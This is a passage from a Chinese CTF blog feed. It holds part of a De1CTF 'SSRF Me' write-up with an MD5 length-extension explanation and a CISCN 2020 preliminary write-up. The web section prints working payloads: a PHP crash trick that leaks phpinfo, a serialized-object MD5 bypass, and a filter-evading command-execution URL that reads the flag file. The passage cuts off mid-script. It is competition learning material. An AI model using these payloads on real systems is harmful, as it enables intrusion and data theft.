srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600940809757"></p><p>urllib.unquote只是简单的进行一个url的解码</p><p>参数通过cookie和get的方式进行传输</p><p>并且对param参数进行了waf过滤</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600941114280.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600941114280.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600941114280"></p><p>所以param参数不可以存在gopher和file读文件</p><p>回去看Task类的exec方法</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600949699589.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600949699589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600949699589"></p><p>当action中有scan字段时会将param参数作为文件名并将该文件写入沙箱所在文件夹下</p><p>当action中有read字段时会读取该文件</p><p>于是猜测param参数传入的应该flag文件的文件名</p><p>action传入的参数应该是readscan</p><p>从而得到flag</p><p>但是</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950116827.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950116827.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950116827"></p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950128505.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950128505.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950128505"></p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950141840.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950141840.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950141840"></p><p>此处有一个md5值的校验</p><p> 而且</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950366176.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950366176.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950366176"></p><p>是随机生成的字段<img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950384270.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950384270.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950384270"></p><p>所以这个题的重点在于如何绕过该限制</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul><li><h4 id="1-字符串构造"><a href="#1-字符串构造" class="headerlink" title="1 字符串构造"></a>1 字符串构造</h4><p>我们发现<img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950658551.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950658551.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950658551"></p></li></ul><p>这是字符串拼接 </p><p>而且在</p><p><img src="/2020/09/24/De1CTF-2019-SSRF-Me/1600950731452.png" class="lazyload" data-srcset="/2020/09/24/De1CTF-2019-SSRF-Me/1600950731452.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1600950731452"></p><p>我们可以通过构造param参数为flag.txtread </p><p>从而可以得到 secert_key+flag.txtreadscan 的md5值</p><p>赋值给sign 绕过该限制</p><ul><li><h4 id="2-md5-hash拓展攻击"><a href="#2-md5-hash拓展攻击" class="headerlink" title="2 md5 hash拓展攻击"></a>2 md5 hash拓展攻击</h4><p>学习连接:<a href="https://www.freebuf.com/articles/database/164019.html">https://www.freebuf.com/articles/database/164019.html</a></p><p>hash拓展作为一种比较有趣的md5攻击方式，利用的是md5算法缺陷</p><blockquote><p>MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</p><p>关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</p><p>MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量。</p></blockquote></li></ul><p><strong>前提是我们需要知道初始字符串的长度</strong></p><p>从而我们通过md5的规则将当前明文补全为512bit的倍数，从而得出新的初始向量</p><p>并将该初始向量作为附加消息生成md5时的初始向量进行md5 运算得到新md5值即为原始消息和附加消息拼接所得的字符串的md5值</p><p> 举个例子：现在我们有 “M0th”字符串的md5值，通过小端等各种规则拆分md5值即可得到向量，并将该向量作为”moth”字符串的md5初始向量，进行md5加密从而可以得到”M0thmoth”字符串的md5值<img src="https://image.3001.net/images/20180306/15203320694308.png" class="lazyload" data-srcset="https://image.3001.net/images/20180306/15203320694308.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020ciscn初赛部分wp</title>
      <link href="2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>初赛还能做些题，复赛要命了</p><span id="more"></span><h2 id="第十三届全国大学生网络安全竞赛创新能力赛初赛部分WP"><a href="#第十三届全国大学生网络安全竞赛创新能力赛初赛部分WP" class="headerlink" title="第十三届全国大学生网络安全竞赛创新能力赛初赛部分WP"></a>第十三届全国大学生网络安全竞赛创新能力赛初赛部分WP</h2><h2 id="团队-SCSCSC"><a href="#团队-SCSCSC" class="headerlink" title="团队:SCSCSC"></a>团队:SCSCSC</h2><p>[TOC]</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web–easyphp"><a href="#web–easyphp" class="headerlink" title="web–easyphp"></a>web–easyphp</h4><p>简单审计分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    <span class="variable">$pid</span> = pcntl_fork();  <span class="comment">#fork一个子进程出来</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>)&#123;</span><br><span class="line">        <span class="variable">$r</span>=pcntl_wait(<span class="variable">$status</span>);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited(<span class="variable">$status</span>))&#123; <span class="comment">#如果子进程状态异常,那么返回 phpinfo</span></span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]); <span class="comment">#传参数当做回调函数的函数名和参数从而来回调该函数</span></span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>那么这个题主要关键就在于call_user_func_array函数身上，如果它能够回调一个会出bug的函数以及其参数，那么就可以，让子进程异常崩溃，从而执行phpinfo()</p><p><a href="https://bugs.php.net/bug.php">https://bugs.php.net/bug.php</a></p><p>在php的官方bug库中进行一番查找发现</p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597974122490-1600656836324.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597974122490-1600656836324.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597974122490"></p><p>则构造payload为</p><p><a href="http://eci-2ze9505q64piew84qx9i.cloudeci1.ichunqiu.com/?a=stream_socket_client&amp;b=%27aa%27">http://eci-2ze9505q64piew84qx9i.cloudeci1.ichunqiu.com/?a=stream_socket_client&amp;b=%27aa%27</a></p><p>执行了phpinfo，而flag就在phpinfo里<img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597974276428-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597974276428-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597974276428"></p><h4 id="web–easytrick"><a href="#web–easytrick" class="headerlink" title="web–easytrick"></a>web–easytrick</h4><p>确实是一个好玩的小trick</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>这个代码逻辑比较简单，就是通过反序列化的方式传入$trick1和$trick2,然后纷纷绕过长度限制5，然后在进行一个md5的强碰撞，就给flag了</p><p>在以往的积累中，我们积累过类似</p><blockquote><p>d131dd02c5e6eec4693d9a0698aff95c<br>2fcab58712467eab4004583eb8fb7f89<br>55ad340609f4b30283e488832571415a<br>085125e8f7cdc99fd91dbdf280373c5b<br>d8823e3156348f5bae6dacd436c919c6<br>dd53e2b487da03fd02396306d248cda0<br>e99f33420f577ee8ce54b67080a80d1e<br>c69821bcb6a8839396f9652b6ff72a70</p><p>d131dd02c5e6eec4693d9a0698aff95c<br>2fcab50712467eab4004583eb8fb7f89<br>55ad340609f4b30283e4888325f1415a<br>085125e8f7cdc99fd91dbd7280373c5b<br>d8823e3156348f5bae6dacd436c919c6<br>dd53e23487da03fd02396306d248cda0<br>e99f33420f577ee8ce54b67080280d1e<br>c69821bcb6a8839396f965ab6ff72a70</p></blockquote><p>的强碰撞样本，但是这次因为strlen的限制，无可奈何，尝试过0x00绕过无果</p><p>另一方面我们尝试过用数组的方式解这个题，但是由于代码中对trick1进行string转化，也无果</p><p>后来再多次尝试下，我们发现md5对大到无穷的数字可以相等</p><p>而无穷本身和无穷并不相等</p><p>但是很遗憾，在php中1/0的值和2/0会强相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$trick1</span>=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line"> <span class="variable">$trick2</span>=<span class="number">2</span>/<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$trick1</span>===<span class="variable">$trick2</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;强相等&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$trick1</span>==<span class="variable">$trick2</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;弱相等&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(md5(<span class="variable">$trick1</span>)==md5(<span class="variable">$trick2</span>))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;强碰撞&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$trick1</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$trick2</span>;</span><br><span class="line"><span class="comment">#结果为 强相等弱相等强碰撞INFINF</span></span><br></pre></td></tr></table></figure><p>然后我们发现 1/0这些值会返回INF,我们去了解了一下INF，发现他在php中用于表示无穷大</p><p>突发奇想：如果’INF’这个当成字符串与数字进行等比较的时候会发生什么呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$trick1</span>=INF;</span><br><span class="line"> <span class="variable">$trick2</span>=<span class="string">&#x27;INF&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$trick1</span>===<span class="variable">$trick2</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;强相等&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$trick1</span>==<span class="variable">$trick2</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;弱相等&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(md5(<span class="variable">$trick1</span>)==md5(<span class="variable">$trick2</span>))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;强碰撞&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$trick1</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$trick2</span>;</span><br><span class="line"><span class="comment">#结果为 强碰撞INFINF</span></span><br></pre></td></tr></table></figure><p><strong>强不相等可以理解，然而弱不相等就好玩了，我们知道 ‘1’和1这些数字是弱相等的，这说明在比较时，’INF’被强制转换成INF，但是此INF显然并不具有作为double型数字的表示无穷大的意义</strong></p><p>根据此原理</p><p>我们可以构造出payload</p><p>trick=O:5:”trick”:2:{s:6:”trick1”;d:INF;s:6:”trick2”;d:INF;}</p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597979156659-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597979156659-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597979156659"></p><h4 id="web–rceme"><a href="#web–rceme" class="headerlink" title="web–rceme"></a>web–rceme</h4><p>通过搜索，发现代码类似于 CVE-2019-9041 </p><p>就去先研究了一波cve</p><p>发现此题只是在原基础上加了一些过滤</p><p>首先找到rce点</p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597979408897-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597979408897-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597979408897"></p><p>根据参数上找只要控制$ifstr参数即可</p><p>比cve来说</p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981025749-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981025749-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597981025749"></p><p>多了一个函数用来过滤，而且基本过滤了命令执行函数</p><p>我们必需要在原来基础上绕过该过滤</p><p>通过.连字符串即可绕过被过滤函数</p><p>payload</p><p><a href="http://eci-2ze6ie6rtdji8r24knig.cloudeci1.ichunqiu.com/?a=%7Bif:(pass.thru)(%27cat%20../../../../flag%27)%7D%7Bend%20if%7D">http://eci-2ze6ie6rtdji8r24knig.cloudeci1.ichunqiu.com/?a={if:(pass.thru)(%27cat%20../../../../flag%27)}{end%20if}</a></p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981272873-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981272873-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597981272873"></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="misc–签到题"><a href="#misc–签到题" class="headerlink" title="misc–签到题"></a>misc–签到题</h4><p>签到挺有意思，都是谁贡献了澳门的ip，tql！</p><h4 id="misc–the-best-ctf-game"><a href="#misc–the-best-ctf-game" class="headerlink" title="misc–the_best_ctf_game"></a>misc–the_best_ctf_game</h4><p>这个题直接放到linux下</p><p>cat一下即可 flag都藏着尾巴处<img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982343415-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597982343415-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597982343415"></p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="re–z3"><a href="#re–z3" class="headerlink" title="re–z3"></a>re–z3</h4><p>比较常规的逆向，打开后直接在main处F5</p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981750280-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981750280-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597981750280"></p><p><img src="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981763322-1600656836325.png" class="lazyload" data-srcset="/2020/09/06/2020ciscn%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1597981763322-1600656836325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597981763322"></p><p>解方程 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 